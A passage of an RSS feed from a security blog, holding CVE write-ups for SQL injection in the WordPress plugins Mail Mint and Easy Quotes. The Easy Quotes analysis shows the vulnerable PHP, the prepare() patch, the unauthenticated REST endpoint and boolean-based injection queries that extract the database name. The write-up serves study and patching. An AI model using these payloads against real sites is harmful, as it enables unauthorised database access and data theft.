width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2025-58604&lt;/strong&gt; vulnerability in the WordPress &lt;strong&gt;Mail Mint&lt;/strong&gt; plugin (prior to version 1.18.6) originates from not using &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; when executing SQL queries.&#xA;Instead, user input was directly concatenated into the SQL statement — leading to a classic SQL Injection vulnerability.&lt;/p&gt;&#xA;&lt;p&gt;The patch now uses &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; to safely construct SQL queries and mitigate this issue.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; when interacting with the WordPress database to prevent SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Regularly update your plugins and perform security reviews to avoid exploitation.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/sql-injection/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;SQL Injection Cheat Sheet - PortSwigger&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/mail-mint/vulnerability/wordpress-mail-mint-plugin-1-18-5-sql-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Mail Mint Plugin &amp;lt;= 1.18.5 is Vulnerable to SQL Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26943 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-09-23-cve-2025-26943/</link>
      <pubDate>Tue, 23 Sep 2025 23:28:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-09-23-cve-2025-26943/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;A vulnerability exists in the &lt;strong&gt;Easy Quotes&lt;/strong&gt; WordPress plugin prior to version &lt;strong&gt;1.2.3&lt;/strong&gt;. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26943&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26943&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/easy-quotes/#description&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Easy Quotes Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: SQL Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Easy Quotes Plugin&lt;/strong&gt;: v1.2.2 (vulnerable) and v1.2.3 (fixed)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;diff tool&lt;/strong&gt;: &lt;strong&gt;meld&lt;/strong&gt; or any tool capable of comparing two versions to show differences&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The application injects user-supplied data directly into an SQL query &lt;strong&gt;without appropriate protections&lt;/strong&gt;, which leads to SQL Injection.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch Diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Use any diff tool to compare the vulnerable version and the patched version.&#xA;A clear difference exists in the file &lt;strong&gt;includes/quotes-data.php&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function get_family_data($family) {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;    return $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM `&amp;#34;.$tablename.&amp;#34;` WHERE `family`=&amp;#39;&amp;#34;.$family.&amp;#34;&amp;#39;;&amp;#34;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch uses &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; instead of concatenating user-supplied data directly into the query:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private static function get_family_data($family) {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;    $sql = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT * FROM %i WHERE `family` = %s&amp;#34;,&#xA;        $tablename, $family&#xA;    );&#xA;    return $wpdb-&amp;gt;get_row($sql);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/patch_dif.png&#34;&#xA;    alt=&#34;Patch diff&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Patch diff&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Many other functions were patched the same way, such as &lt;code&gt;get_font_variant($family_id, $variant_id)&lt;/code&gt;, &lt;code&gt;get_font_variants($family)&lt;/code&gt;, and &lt;code&gt;get_fonts($category = -1)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Although &lt;code&gt;get_fonts_categories()&lt;/code&gt; was also updated, it does not accept user input and is thus not relevant to the SQLi issue:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function get_fonts_categories() {&#xA;    /** @var wpdb $wpdb */&#xA;    global $wpdb;&#xA;    $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-categories&amp;#39;;&#xA;    $sql = $wpdb-&amp;gt;prepare(&#xA;        &amp;#34;SELECT `category_id`, `category` FROM %i&amp;#34;,&#xA;        $tablename&#xA;    );&#xA;    return $wpdb-&amp;gt;get_results($sql);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;how-it-works&#34;&gt;&lt;span&gt;How it works&lt;/span&gt;&#xA;  &lt;a href=&#34;#how-it-works&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;We exploit the SQL Injection in the function &lt;code&gt;get_family_data($family)&lt;/code&gt;, and other functions are vulnerable in a similar manner.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;get_family_data()&lt;/code&gt; is a private function in the &lt;code&gt;Quotes_Data&lt;/code&gt; class (the example below shows context):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Quotes_Data&#xA;{&#xA;    function __construct()&#xA;    {&#xA;        add_filter(&amp;#39;posts_where&amp;#39;, array($this, &amp;#39;posts_where&amp;#39;), 10, 2);&#xA;    }&#xA;&#xA;    // other functions&#xA;&#xA;    public static function get_font_variants($family) {&#xA;        $familyData = self::get_family_data($family);&#xA;        // other logic&#xA;    }&#xA;&#xA;    public static function get_family($family, $variant_id) {&#xA;        $family_data = (array)self::get_family_data($family);&#xA;        // other logic&#xA;    }&#xA;&#xA;    private static function get_family_data($family) {&#xA;        /** @var wpdb $wpdb */&#xA;        global $wpdb;&#xA;        $tablename = $wpdb-&amp;gt;prefix . &amp;#39;easy-quotes-families&amp;#39;;&#xA;        return $wpdb-&amp;gt;get_row(&amp;#34;SELECT * FROM `&amp;#34;.$tablename.&amp;#34;` WHERE `family`=&amp;#39;&amp;#34;.$family.&amp;#34;&amp;#39;;&amp;#34;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_family_data()&lt;/code&gt; is called by &lt;code&gt;get_family()&lt;/code&gt; and &lt;code&gt;get_font_variants()&lt;/code&gt;; to find where these are used, search for &lt;code&gt;get_family&lt;/code&gt; or &lt;code&gt;get_font_variants&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/search_func.png&#34;&#xA;    alt=&#34;Search function&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Search function&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;The &lt;code&gt;get_font_variants()&lt;/code&gt; function is invoked by &lt;code&gt;rest_route_callback_font_variants()&lt;/code&gt; in the &lt;code&gt;Quotes_Rest_Route&lt;/code&gt; class:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Quotes_Rest_Route&#xA;{&#xA;    function __construct()&#xA;    {&#xA;        add_action(&amp;#39;rest_api_init&amp;#39;, array($this, &amp;#39;rest_api_init&amp;#39;));&#xA;    }&#xA;&#xA;    /**&#xA;     * Register my REST route&#xA;     *&#xA;     * @return void&#xA;     */&#xA;    function rest_api_init($wp_rest_server)&#xA;    {&#xA;        $args = [&#xA;            &amp;#39;method&amp;#39;                =&amp;gt; WP_REST_Server::READABLE,&#xA;            &amp;#39;callback&amp;#39;              =&amp;gt; [$this, &amp;#39;rest_route_callback_quote&amp;#39;],&#xA;            &amp;#39;permission_callback&amp;#39;   =&amp;gt; &amp;#39;__return_true&amp;#39;&#xA;        ];&#xA;        register_rest_route(&amp;#39;layart/v1&amp;#39;, &amp;#39;/quote&amp;#39;, $args);&#xA;&#xA;        // other logic&#xA;&#xA;        $args[&amp;#39;callback&amp;#39;] = [$this, &amp;#39;rest_route_callback_font_variants&amp;#39;];&#xA;        register_rest_route(&amp;#39;layart/v1&amp;#39;, &amp;#39;/font-variants&amp;#39;, $args);&#xA;    }&#xA;&#xA;    // other functions&#xA;&#xA;    function rest_route_callback_font_variants(WP_REST_Request $request)&#xA;    {&#xA;        $family = $request-&amp;gt;get_param(&amp;#39;family&amp;#39;);&#xA;        $family = isset($family) ? $family : &amp;#34;Shadows Into Light&amp;#34;;&#xA;&#xA;        $response = Quotes_Data::get_font_variants($family);&#xA;        return rest_ensure_response($response);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The constructor of &lt;code&gt;Quotes_Rest_Route&lt;/code&gt; uses &lt;code&gt;add_action(&#39;rest_api_init&#39;, ...)&lt;/code&gt; to register endpoints with WordPress&amp;rsquo;s REST API system.&lt;/p&gt;&#xA;&lt;p&gt;The callback &lt;code&gt;rest_route_callback_font_variants&lt;/code&gt; corresponds to the endpoint &lt;code&gt;/wp-json/layart/v1/font-variants?family=family_name&lt;/code&gt;. If the &lt;code&gt;family&lt;/code&gt; parameter is not provided, it defaults to &lt;code&gt;Shadows Into Light&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;detecting-sqli&#34;&gt;&lt;span&gt;Detecting SQLi&lt;/span&gt;&#xA;  &lt;a href=&#34;#detecting-sqli&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;We use a &lt;strong&gt;Boolean-based SQL Injection&lt;/strong&gt; technique to test whether the &lt;code&gt;family&lt;/code&gt; parameter is injectable.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;True request&lt;/strong&gt; (example):&#xA;When the injected condition evaluates to true, the query returns normally:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39; AND &amp;#39;1&amp;#39;=&amp;#39;1&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;False request&lt;/strong&gt; (example):&#xA;When the injected condition is false, no results are returned:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39; AND &amp;#39;1&amp;#39;=&amp;#39;2&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-first-letter-of-database-name&#34;&gt;&lt;span&gt;Get First Letter of Database Name&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-first-letter-of-database-name&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;A prerequisite to dumping data is being able to extract a single character of the database name; once you can obtain one character, you can typically extract the rest.&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;In my test environment the database name is &lt;strong&gt;wordpress&lt;/strong&gt;, so the first character is &lt;code&gt;w&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-09-23-cve-2025-26943/first_letter.png&#34;&#xA;    alt=&#34;First letter&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;First letter&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;A payload checking &lt;code&gt;SUBSTRING(DATABASE(),1,1)=&#39;w&#39;&lt;/code&gt; returns data normally, confirming the first letter is &lt;code&gt;w&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;SELECT * FROM wp_easy-quotes-families WHERE family=&amp;#39;Roboto&amp;#39; AND SUBSTRING(DATABASE(),1,1)=&amp;#39;w&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability &lt;strong&gt;CVE-2025-26943&lt;/strong&gt; in the WordPress &lt;strong&gt;Easy Quotes&lt;/strong&gt; plugin (versions prior to &lt;strong&gt;1.2.3&lt;/strong&gt;) is caused by concatenating user-supplied input directly into SQL queries instead of using prepared statements (&lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;), which results in SQL Injection.&lt;/p&gt;&#xA;&lt;p&gt;The official patch replaces string concatenation with &lt;code&gt;$wpdb-&amp;gt;prepare&lt;/code&gt;, ensuring user input is safely handled.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Always use &lt;code&gt;$wpdb-&amp;gt;prepare()&lt;/code&gt; when interacting with the database in WordPress to prevent SQL Injection.&lt;/li&gt;&#xA;&lt;li&gt;Regularly update plugins and perform security checks to avoid becoming an attack target.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a 